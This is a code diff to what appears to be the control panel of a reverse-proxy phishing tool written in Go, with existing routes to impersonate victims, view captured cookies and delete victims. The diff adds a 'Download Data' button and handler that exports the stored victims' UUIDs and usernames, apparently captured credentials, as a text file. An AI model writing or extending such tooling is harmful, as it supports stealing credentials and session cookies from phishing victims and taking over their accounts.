@@ -98,6 +98,15 @@ function deleteVictim(uuid){
 	});
 }
 
+function downloadData() {
+	const link = document.createElement("a");
+	link.href = "/{{$.URL}}/DownloadData";
+	link.download = "data.txt";
+	document.body.appendChild(link);
+	link.click();
+	document.body.removeChild(link);
+}
+
   </script>
 </head>
 <body>
@@ -116,6 +125,9 @@ function deleteVictim(uuid){
           <h4>Terminations</h4>
           <p style="font-weight:bold;font-size: 1em;">{{.TermCount}} ({{printf "%.1f" .TermPercent}}%)</p>
       </div>
+	<div class="col-md-4 text-center">
+		<button onclick="downloadData()" class="btn btn-success">Download Data</button>
+	  </div>
   </div>
   
   <hr>
@@ -723,6 +735,35 @@ func HelloHandlerDeleteVictim(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
+func HelloHandlerDownloadData(w http.ResponseWriter, r *http.Request) {
+
+	//Grabbing Entries
+	victims, _ := CConfig.listEntries()
+
+	var recordString strings.Builder
+	var terminateString string
+
+	for _, victim := range victims {
+
+		if victim.Username != "" || victim.Password != "" {
+
+			if victim.Terminated == true {
+				terminateString = "Y"
+			} else {
+				terminateString = "N"
+			}
+
+			recordString.WriteString(fmt.Sprintf("UUID: %s\nUsername: %s\nTerminated: %s\n\n",
+				victim.UUID, victim.Username, terminateString))
+		}
+	}
+
+	w.Header().Set("Content-Type", "text/plain")
+	w.Header().Set("Content-Disposition", "attachment; filename=\"data.txt\"")
+	w.WriteHeader(http.StatusOK)
+	w.Write([]byte(recordString.String()))
+}
+
 func HelloHandlerImpersonate(w http.ResponseWriter, r *http.Request) {
 
 	users, ok := r.URL.Query()["user_id"]
@@ -1031,6 +1072,7 @@ func init() {
 		handler.HandleFunc("/"+CConfig.url+"/Impersonate", use(HelloHandlerImpersonate, basicAuth))
 		handler.HandleFunc("/"+CConfig.url+"/Cookies", use(HelloHandlerCookieDisplay, basicAuth))
 		handler.HandleFunc("/"+CConfig.url+"/DeleteVictim", use(HelloHandlerDeleteVictim, basicAuth))
+		handler.HandleFunc("/"+CConfig.url+"/DownloadData", use(HelloHandlerDownloadData, basicAuth))
 
 		log.Infof("Control Panel: " + CConfig.url + " handler registered	")
 		log.Infof("Control Panel URL: " + *config.C.ProxyDomain + "/" + CConfig.url)
